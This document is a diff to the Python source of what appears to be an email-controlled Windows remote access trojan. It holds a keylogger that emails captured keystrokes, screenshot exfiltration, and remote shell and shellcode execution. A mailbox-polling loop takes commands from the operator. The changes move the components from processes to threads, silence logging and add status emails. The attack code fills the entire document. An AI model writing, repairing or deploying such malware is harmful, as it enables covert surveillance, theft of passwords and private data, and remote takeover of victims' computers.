@@ -3,7 +3,6 @@ import sys
 import os
 import base64
 import binascii
-import multiprocessing
 import threading
 import time
 import random
@@ -18,13 +17,13 @@ import win32process
 import win32api
 import win32con
 import win32gui
-import logging
+#import logging
 import pythoncom
 import pyHook
 import win32security
 
 from PIL import ImageGrab
-from traceback import print_exc, format_exc
+#from traceback import print_exc, format_exc
 from ntsecuritycon import *
 from win32com.shell import shell
 from smtplib import SMTP
@@ -41,13 +40,13 @@ server_port = 587
 #######################################
 
 #Prints error messages and info to stdout
-verbose = True
-log_level = 20 
+#verbose = True
+#log_level = 20 
 
-if verbose is True:
-    log_level = 10
+#if verbose is True:
+#    log_level = 10
 
-logging.basicConfig(level=log_level, format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
+#logging.basicConfig(level=log_level, format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
 
 #generates a unique uuid 
 uniqueid = str(uuid.uuid5(uuid.NAMESPACE_OID, os.environ['USERNAME']))
@@ -87,19 +86,21 @@ class msgparser:
     def getDateHeader(self, msg_data):
         self.date = email.message_from_string(msg_data[1][0][1])['Date']
 
-class KeyLogger(multiprocessing.Process):
+class KeyLogger(threading.Thread):
 
     def __init__(self):
 
-        multiprocessing.Process.__init__(self)
+        threading.Thread.__init__(self)
 
         self.jobid = None
         self.key_buffer = ''
 
-        self.daemon = True
+        self.setDaemon(True)
 
     def run(self):
-        logging.debug("[keylogger] started with jobid: {}".format(self.jobid))
+        #logging.debug("[keylogger] started with jobid: {}".format(self.jobid))
+        t = threading.Thread(name='sendEmail', target=sendEmail, args=({'CMD': 'keylogger', 'RES': 'Keylogger started'}, self.jobid,))
+        t.start()
 
         while True:
             hm = pyHook.HookManager() 
@@ -108,8 +109,10 @@ class KeyLogger(multiprocessing.Process):
             pythoncom.PumpMessages()
 
     def stop(self):
-        logging.debug("[keylogger] stopped with jobid: {}".format(self.jobid))
-        self.terminate()
+        #logging.debug("[keylogger] stopped with jobid: {}".format(self.jobid))
+        t = threading.Thread(name='sendEmail', target=sendEmail, args=({'CMD': 'keylogger', 'RES': 'Keylogger stopped'}, self.jobid,))
+        t.start()
+        self.join()
 
     def onKeyboardEvent(self, event):
         if event.Ascii != 0 or 8:
@@ -119,16 +122,16 @@ class KeyLogger(multiprocessing.Process):
             self.key_buffer += chr(event.Ascii)
 
         if len(self.key_buffer) is 100:
-            logging.debug("[keylogger] Resetting key_buffer")
-            t = threading.Thread(name='sendEmail', target=sendEmail, args=({'CMD': 'keylogger', 'RES': self.key_buffer}, self.jobid,))
-            t.setDaemon(True)
-            t.start()
+            #logging.debug("[keylogger] Resetting key_buffer")
+            #t = threading.Thread(name='sendEmail', target=sendEmail, args=({'CMD': 'keylogger', 'RES': self.key_buffer}, self.jobid,))
+            #t.start()
+            sendEmail({'CMD': 'keylogger', 'RES': self.key_buffer}, self.jobid)
             self.key_buffer = ''
 
-class download(multiprocessing.Process):
+class download(threading.Thread):
 
     def __init__(self, jobid, filepath):
-        multiprocessing.Process.__init__(self)
+        threading.Thread.__init__(self)
         self.jobid = jobid
         self.filepath = filepath
 
@@ -144,10 +147,10 @@ class download(multiprocessing.Process):
         except Exception as e:
             sendEmail({'CMD': 'download', 'RES': 'Failed: {}'.format(e)}, self.jobid)
 
-class lockScreen(multiprocessing.Process):
+class lockScreen(threading.Thread):
 
     def __init__(self, jobid):
-        multiprocessing.Process.__init__(self)
+        threading.Thread.__init__(self)
         self.jobid = jobid
 
         self.daemon = True
@@ -158,12 +161,13 @@ class lockScreen(multiprocessing.Process):
             ctypes.windll.user32.LockWorkStation()
             sendEmail({'CMD': 'lockscreen', 'RES': 'Success'}, jobid=self.jobid)
         except Exception as e:
-            if verbose == True: print print_exc()
+            #if verbose == True: print print_exc()
+            pass
 
-class screenshot(multiprocessing.Process):
+class screenshot(threading.Thread):
 
     def __init__(self, jobid):
-        multiprocessing.Process.__init__(self)
+        threading.Thread.__init__(self)
         self.jobid = jobid
 
         self.daemon = True
@@ -177,13 +181,13 @@ class screenshot(multiprocessing.Process):
             sendEmail({'CMD': 'screenshot', 'RES': 'Screenshot taken'}, jobid=self.jobid, attachment=[saveas])
             os.remove(saveas)
         except Exception as e:
-            if verbose == True: print_exc()
+            #if verbose == True: print_exc()
             pass
 
-class execShellcode(multiprocessing.Process):
+class execShellcode(threading.Thread):
 
     def __init__(self, shellc, jobid):
-        multiprocessing.Process.__init__(self)
+        threading.Thread.__init__(self)
         self.shellc = shellc
         self.jobid = jobid
 
@@ -214,12 +218,13 @@ class execShellcode(multiprocessing.Process):
 
             sendEmail({"CMD": 'execshellcode', 'RES': 'Success'}, jobid=self.jobid)
         except Exception as e:
-            if verbose == True: print_exc()
+            #if verbose == True: print_exc()
+            pass
 
-class execCmd(multiprocessing.Process):
+class execCmd(threading.Thread):
 
     def __init__(self, command, jobid):
-        multiprocessing.Process.__init__(self)
+        threading.Thread.__init__(self)
         self.command = command
         self.jobid = jobid
 
@@ -234,11 +239,12 @@ class execCmd(multiprocessing.Process):
 
             sendEmail({'CMD': self.command, 'RES': stdout_value}, jobid=self.jobid)
         except Exception as e:
-            if verbose == True: print_exc()
+            #if verbose == True: print_exc()
             pass
 
 def sendEmail(text, jobid='', attachment=[], checkin=False):
     sub_header = uniqueid
+    print uniqueid, jobid
     if jobid:
         sub_header = 'imp:{}:{}'.format(uniqueid, jobid)
     elif checkin:
@@ -270,7 +276,7 @@ def sendEmail(text, jobid='', attachment=[], checkin=False):
             mailServer.quit()
             break
         except Exception as e:
-            if verbose == True: print_exc()
+            #if verbose == True: print_exc()
             time.sleep(10)
 
 def checkJobs():
@@ -289,7 +295,7 @@ def checkJobs():
 
             for msg_id in id_list[0].split():
                 
-                logging.debug("[checkJobs] parsing message with uid: {}".format(msg_id))
+                #logging.debug("[checkJobs] parsing message with uid: {}".format(msg_id))
                 
                 msg_data = c.uid('fetch', msg_id, '(RFC822)')
                 msg = msgparser(msg_data)
@@ -299,7 +305,7 @@ def checkJobs():
                     cmd = msg.dict['CMD'].lower()
                     arg = msg.dict['ARG']
 
-                    logging.debug("[checkJobs] CMD: {} JOBID: {}".format(cmd, jobid))
+                    #logging.debug("[checkJobs] CMD: {} JOBID: {}".format(cmd, jobid))
 
                     if cmd == 'execshellcode':
                         execShellcode(arg, jobid)
@@ -317,14 +323,13 @@ def checkJobs():
                         lockScreen(jobid)
 
                     elif cmd == 'startkeylogger':
-                        if not keylogger.is_alive():
+                        if not keylogger.isAlive():
                             keylogger.jobid = jobid
                             keylogger.start()
 
                     elif cmd == 'stopkeylogger':
-                        if keylogger.is_alive():
+                        if keylogger.isAlive():
                             keylogger.stop()
-                            keylogger.join()
 
                     elif cmd == 'forcecheckin':
                         sendEmail("Host checking in as requested", checkin=True)
@@ -337,7 +342,7 @@ def checkJobs():
             time.sleep(10)
         
         except Exception as e:
-            logging.debug(format_exc())
+            #logging.debug(format_exc())
             time.sleep(10)
 
 if __name__ == '__main__':
